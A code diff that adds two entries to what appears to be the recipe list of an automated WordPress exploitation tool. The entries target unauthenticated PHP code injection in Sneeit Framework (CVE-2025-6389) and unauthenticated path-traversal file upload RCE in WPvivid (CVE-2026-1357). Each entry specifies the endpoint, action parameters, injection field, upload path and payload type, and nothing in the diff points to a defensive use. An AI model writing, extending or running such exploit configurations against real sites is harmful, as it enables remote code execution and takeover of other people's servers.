@@ -231,6 +231,45 @@ RECIPES = [
                 "nonce required; unauthenticated users can submit comments and "
                 "trigger payload evaluation.",
     },
+    {
+        "plugin": "sneeit-framework",
+        "cve": "CVE-2025-6389",
+        "affected": "<=8.3",
+        "mode": "sneeit-callback-injection",
+        "method": "POST",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "params": {"action": "sneeit_articles_pagination"},
+        "inject_param": "callback",
+        "upload_path": "/wp-content/plugins/sneeit-framework/{filename}",
+        "payload_type": "call-user-func-injection",
+        "source": "registry",
+        "note": "Unauth PHP code injection (CVE-2025-6389, Sneeit Framework "
+                "<=8.3): sneeit_articles_pagination_callback() passes the "
+                "'callback' parameter directly to call_user_func() without "
+                "sanitization, allowing arbitrary PHP execution. Payload "
+                "submitted via wp-admin/admin-ajax.php with no authentication. "
+                "131K+ attacks recorded since discovery.",
+    },
+    {
+        "plugin": "wpvivid-backup-migration",
+        "cve": "CVE-2026-1357",
+        "affected": "<=0.9.123",
+        "mode": "wpvivid-encrypted-upload",
+        "method": "POST",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "params": {"action": "wpvivid_action", "method": "send_to_site"},
+        "field": "wpvivid_payload",
+        "upload_path": "/wp-content/uploads/{filename}",
+        "encryption_key": None,
+        "payload_type": "path-traversal-upload",
+        "source": "registry",
+        "note": "Unauth file upload RCE (CVE-2026-1357, WPvivid <=0.9.123): "
+                "RSA decryption failure passes false to AES cipher, creating "
+                "predictable null-byte encryption key. Combined with missing "
+                "filename sanitization, enables path traversal to upload "
+                "arbitrary PHP to web-accessible directories. No authentication "
+                "required. 900K+ installations targeted.",
+    },
 ]
 
 
